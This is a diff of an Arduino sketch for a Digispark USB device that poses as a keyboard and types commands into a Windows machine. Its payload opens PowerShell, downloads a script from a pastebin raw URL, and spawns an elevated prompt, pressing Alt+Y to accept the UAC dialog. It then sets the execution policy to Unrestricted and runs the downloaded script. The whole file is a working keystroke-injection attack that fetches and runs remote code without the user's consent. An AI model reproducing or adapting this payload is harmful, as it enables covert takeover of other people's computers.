@@ -21,28 +21,23 @@ void loop() {
     }
   DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
-  
+
   DigiKeyboard.println("powershell");
-  DigiKeyboard.println("$path = \"$env:USERPROFILE\\wallpaper.jpg\"");
-  DigiKeyboard.println("$path2 = \"$env:USERPROFILE\\script.ps1\"");
+  DigiKeyboard.delay(300);
   DigiKeyboard.println("$client = new-object System.Net.WebClient");
-  DigiKeyboard.println("Remove-Item $path");
-  DigiKeyboard.delay(200);
-  DigiKeyboard.println("$client.DownloadFile(\""link"\" , $path)");
-  DigiKeyboard.delay(10000);
-
-
-
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/KfR02ySi\" , \"script.ps1\")");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
-  DigiKeyboard.delay(750);
 
+  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\" , \"script.ps1\")");
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
+  DigiKeyboard.delay(750);
   DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
   DigiKeyboard.delay(750);
-  DigiKeyboard.println("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
   
+  DigiKeyboard.print("powershell.exe -File %USERPROFILE%\\script.ps1");
 
   digitalWrite(1, LOW);
   for(;;){}
